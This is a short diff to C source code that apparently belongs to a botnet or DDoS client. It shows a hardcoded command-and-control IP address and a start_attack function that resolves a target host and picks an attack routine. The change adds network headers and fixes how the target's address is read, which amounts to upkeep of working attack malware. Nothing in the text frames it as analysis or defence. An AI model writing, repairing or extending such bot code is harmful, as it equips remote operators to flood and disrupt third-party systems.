@@ -14,6 +14,9 @@
 #include <signal.h>
 #include <fcntl.h>
 #include <sys/utsname.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <netdb.h>
 
 #define BUFFER_SIZE 4096
 #define CNC_IP "45.134.39.212"
@@ -369,7 +372,9 @@ void start_attack(char *cmd) {
     strcpy(current_attack.path, "/");
 
     struct hostent *he = gethostbyname(target);
-    if (he) strcpy(current_attack.target, inet_ntoa(*(struct in_addr*)he->h_addr));
+    if (he) {
+        strcpy(current_attack.target, inet_ntoa(*(struct in_addr*)he->h_addr_list[0]));
+    }
 
     void *(*attack_func)(void *) = NULL;
 
